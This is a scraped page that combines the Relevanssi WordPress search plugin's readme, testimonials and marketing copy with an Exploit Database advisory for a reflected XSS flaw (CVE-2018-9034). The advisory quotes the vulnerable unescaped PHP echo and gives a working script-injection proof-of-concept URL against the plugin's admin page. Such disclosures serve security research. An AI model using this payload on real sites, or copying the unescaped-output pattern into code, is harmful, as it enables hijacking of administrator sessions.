## Description

Relevanssi replaces the standard WordPress search with a better search engine, with lots of features and configurable options. You’ll get better results, better presentation of results – your users will thank you.

This is the free version of Relevanssi. There’s also Relevanssi Premium, which has added features. For more information about Premium, see [Relevanssi.com](https://www.relevanssi.com/).

Do note that using Relevanssi may require large amounts (hundreds of megabytes) of database space (for a reasonable estimate, multiply the size of your `wp_posts` database table by three). If your hosting setup has a limited amount of space for database tables, using Relevanssi may cause problems. In those cases use of Relevanssi cannot be recommended.

#### Key features

* Search results sorted in the order of relevance, not by date.
* Fuzzy matching: match partial words, if complete words don’t match.
* Find documents matching either just one search term (OR query) or require all words to appear (AND query).
* Search for phrases with quotes, for example “search phrase”.
* Create custom excerpts that show where the hit was made, with the search terms highlighted.
* Highlight search terms in the documents when user clicks through search results.
* Search comments, tags, categories and custom fields.
* Multisite friendly.
* bbPress support.
* Gutenberg friendly.

#### Advanced features

* Adjust the weighting for titles, tags and comments.
* Log queries, show most popular queries and recent queries with no hits.
* Restrict searches to categories and tags using a hidden variable or plugin settings.
* Index custom post types and custom taxonomies.
* Index the contents of shortcodes.
* Google-style “Did you mean?” suggestions based on successful user searches.
* Support for [WPML multi-language plugin](http://wpml.org/) and [Polylang](https://wordpress.org/plugins/polylang/).
* Support for [s2member membership plugin](http://www.s2member.com/), [Members](https://wordpress.org/plugins/members/), [Groups](https://wordpress.org/plugins/groups/), [Simple Membership](https://wordpress.org/plugins/simple-membership/) and other membership plugins.
* Advanced filtering to help hacking the search results the way you want.
* Search result throttling to improve performance on large databases.
* Disable indexing of post content and post titles with a simple filter hook.

#### Premium features (only in Relevanssi Premium)

* Indexing attachment content (PDF, Office, Open Office).
* Improved spelling correction in “Did you mean?” suggestions.
* Searching across multiple sites in the same multisite installation.
* Search and index user profiles.
* Search and index taxonomy term pages (categories, tags, custom taxonomies).
* Search and index arbitrary columns in wp\_posts MySQL table.
* Assign weights to any post types and taxonomies.
* Assign extra weight to new posts.
* Let the user choose between AND and OR searches, use + and – operator (AND and NOT).
* Export and import settings.
* [WP CLI commands](https://www.relevanssi.com/user-manual/wp-cli/).
* [Related posts](https://www.relevanssi.com/knowledge-base/related-posts/).
* [Redirects for searches](https://www.relevanssi.com/user-manual/redirects/).

## Installation

1. Install the plugin from the WordPress plugin screen.
2. Activate the plugin.
3. Go to the plugin settings page and build the index following the instructions there.
4. That’s it!

Relevanssi uses the standard search form and doesn’t usually need any changes in the search results template.

If the search does not bring any results, your theme probably has a query\_posts() call in the search results template. That throws Relevanssi off. For more information, see [The most important Relevanssi debugging trick](https://www.relevanssi.com/knowledge-base/query_posts/).

#### Uninstalling

To uninstall the plugin remove the plugin using the normal WordPress plugin management tools (from the Plugins page, first Deactivate, then Delete). If you remove the plugin files manually, the database tables and options will remain.

## FAQ

### Knowledge Base

You can find solutions and answers at the [Relevanssi Knowledge Base](https://www.relevanssi.com/category/knowledge-base/).

### Contextual help

Answers to many common problems can be found from the contextual menu. Just click “Help” in the top right corner of your WordPress admin dashboard on the Relevanssi settings page.

### Relevanssi doesn’t work

If you the results don’t change after installing and activating Relevanssi, the most likely reason is that you have a call to `query_posts()` on your search results template. This confuses Relevanssi. Try removing the `query_posts()` call and see what happens.

### Searching for words with ampersands or hyphens doesn’t work

Please read [Words with punctuation can’t be found](https://www.relevanssi.com/knowledge-base/words-ampersands-cant-found/). This is a Relevanssi feature, but you can fix it from Relevanssi indexing settings.

### Where are the user search logs?

See the top of the admin menu. There’s ‘User searches’.

### Displaying the relevance score

Relevanssi stores the relevance score it uses to sort results in the $post variable. Just add something like

```
echo $post->relevance_score

```

to your search results template inside a PHP code block to display the relevance score.

### Did you mean? suggestions

Relevanssi offers Google-style “Did you mean?” suggestions. See [“Did you mean” suggestions](https://www.relevanssi.com/knowledge-base/did-you-mean-suggestions/) in the Knowledge Base for more details.

### What is tf \* idf weighing?

It’s the basic weighing scheme used in information retrieval. Tf stands for *term frequency* while idf is *inverted document frequency*. Term frequency is simply the number of times the term appears in a document, while document frequency is the number of documents in the database where the term appears.

Thus, the weight of the word for a document increases the more often it appears in the document and the less often it appears in other documents.

### What are stop words?

Each document database is full of useless words. All the little words that appear in just about every document are completely useless for information retrieval purposes. Basically, their inverted document frequency is really low, so they never have much power in matching. Also, removing those words helps to make the index smaller and searching faster.

We bought Premium yesterday and by the end of today we were able to do a proof of concept for a news archive we are putting together.  In one day of development I was able to put together a page of pdf’s with mixed Lithuanian and English text.  I was able to restrict the search on the page to a few categories and exclude unrelated pages on the site.
Your documentation on the modifications required to the functions.php file was really good and I was able to make the changes even though I don’t know php.
We will be moving to multisite in future and I am confident we will be able to port this to the new site without difficulty. Thanks, Mikko!

I was really impressed by the quick support from the plugin team; Relevanssi Search has greatly improved the search functionality on my WordPress site. It provides more accurate and relevant results than the default search, with features like custom post type indexing and partial matching.Thanks to the developer(s)

I had a pleasure of using this plugin for some time and it was great. Fantastic functionality and as I recently found it also has fantastic support from plugin authors (Mikko specifically). I hope I can go for a premium version of the plugin for my future project.

# Fix your WordPress search!

## Testimonials

Relevanssi customer service was fantastic. When the project I was working on got cancelled shortly after purchasing Relevanssi Premium, they were quick to provide me with a full refund without any hassle at all. Thank you Mikko and the Relevanssi team.

## Matt H

I wanted to boost the regular search function for a website that
contains many documents. I wanted to achieve that searching could be
performed much more accurately and visitors are served faster. For this
I bought the Relevanssi premium plugin. I received fantastic and fast
help for the installation. I strongly recommend going a step further and
buy the premium version!

## Bart / NL34

I’d just like to give a shout out to how awesome this plugin is (Premium version). I have a site with pages, standard posts and a custom post for a document library where a couple gigs of PDFs are stored on AWS S3 using another plugin, and Relevanssi does a full-text index of all of it and returns context-sensitive results in less than a second. Plus good documentation and a responsive developer. This is the stuff of dreams.

## Nancy Hildebrandt

## Power up your WordPress search

Relevanssi has bunch of [features](https://www.relevanssi.com/features/ "Features") and lots of room for customization.

But it's not really about features, it's about what you get from using Relevanssi:

* **Better results** for your users, which means **happy users**.
* **Better control over search results** for you.
* **Better experience for both you and your users**.
![Mikko Saari](/wp-content/uploads/2021/07/mikko-1024x1024.jpg)

**Meet the developer of Relevanssi**

Relevanssi is the work of one person, Mikko Saari, a developer from Tampere, Finland. I'm doing Relevanssi alone.

This means that every support request you make gets you in direct contact with the one person who cares most and knows best.

What comes to long time commitment, I'm dedicated to running Relevanssi. I've been doing it for a decade now. Relevanssi pays my bills and feeds my family, so I'm highly motivated to keeping it going.

## Free or Premium

Relevanssi comes in two flavours. **Free version of Relevanssi** is available from [WordPress Plugin Repository](http://wordpress.org/extend/plugins/relevanssi/). It does the job and has over 1,600,000 downloads and more than 100,000 active installations and many satisfied users. For those who want something better, there's **Relevanssi Premium**, which you can buy here.

So why go Premium, when the free version is available?

* **Guaranteed support**. Free version users get support if I have enough time available.
* **Additional features**. Relevanssi is developed actively and new features are added. Free version users won't get the new features, or get them long after Premium users have enjoyed them.
* **Future development**. More users for Relevanssi Premium means I can spend more time developing the plugin.

[See Relevanssi Premium prices and buy yours here!](https://www.relevanssi.com/buy-premium/ "Buy Premium")

## Licensing options explained

There are two different licensing options:

* **Annual** is valid for a year and provides access to upgrades and support. Once a year has passed, the plugin will still work, but you won’t get access to upgrades, support or attachment indexing services, until you renew the license.
* **Permanent** gives you lifetime access to upgrades and support.

Both licenses let you use Relevanssi on unlimited number of sites, Relevanssi use is not restricted to a limited number of sites.

The annual license include support and upgrades for a year. It is not a subscription: once a year has passed, the license expires and you need to renew if you want it to continue, but you will not be billed automatically.

## Custom search development

Relevanssi is a great plugin, but it can't cover all specialized needs. It can be adapted to many demands with custom modifications, though, so just contact me and we can build you the **custom search plugin you need**, based on the awesome power of Relevanssi.

## [Premium 2.26 / Free 4.23 release notes](https://www.relevanssi.com/release-notes/premium-2-26-free-4-23-release-notes/)

This version includes bug fixes, small quality-of-life improvements, and a small security fix. In earlier versions, Relevanssi included password-protected posts in the search results. This can be used to glean information about the posts’ contents. Since I know some people will still need this functionality, the old behaviour can be enabled with a filter function.…

## [GeneratePress: Query Loop](https://www.relevanssi.com/knowledge-base/generatepress-query-loop/)

Relevanssi doesn’t work automatically with the Query Loop block in GeneratePress and GenerateBlocks. Fortunately, the solution is simple: the Query Loop block has a filter hook for adjusting the query parameters, and you can use that filter hook to enable Relevanssi. Add this to your site: Thanks to Ben Knowles.

# Exploit Title : Relevanssi Wordpress Search Plugin Reflected Cross Site Scripting (XSS)
# Date: 23-03-2018
# Exploit Author : Stefan Broeder
# Contact : https://twitter.com/stefanbroeder
# Vendor Homepage: https://www.relevanssi.com
# Software Link: https://wordpress.org/plugins/relevanssi
# Version: 4.0.4
# CVE : CVE-2018-9034
# Category : webapps

Description
===========
Relevanssi is a WordPress plugin with more than 100.000 active installations. Version 4.0.4 (and possibly previous versions) are affected by a Reflected XSS vulnerability.

Vulnerable part of code
=======================
File: relevanssi/lib/interface.php:1055 displays unescaped value of $_GET variable 'tab'.

..
1049 if( isset( $_REQUEST[ 'tab' ] ) ) {
1050 $active_tab = $_REQUEST[ 'tab' ];
1051 } // end if
1052
1053 if ($active_tab === "stopwords") $display_save_button = false;
1054
1055 echo "<input type='hidden' name='tab' value='$active_tab' />";
..

Impact
======
Arbitrary JavaScript code can be run on browser side if a logged in WordPress administrator is tricked to click on a link or browse a URL under the attacker control.
This can potentially lead to creation of new admin users, or remote code execution on the server.

Proof of Concept
============
In order to exploit this vulnerability, the attacker needs to have the victim visit the following link:

/wp-admin/options-general.php?page=relevanssi%2Frelevanssi.php&tab='><SCRIPT>var+x+%3D+String(%2FXSS%2F)%3Bx+%3D+x.substring(1%2C+x.length-1)%3Balert(x)<%2FSCRIPT><BR+

Please note that quotes and double quotes are properly escaped by WordPress, however javascript escaping (\) is applied while the value is in an HTML attribute. There, escaping a quote by \' has no effect (&quot should be used). This allows us to break out of the HTML attribute and start the script tag. Within the script, quotes are properly escaped but there are ways to obfuscate javascript without requiring these symbols as can be seen in above payload.

Solution
========

Update to version 4.1

```

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.
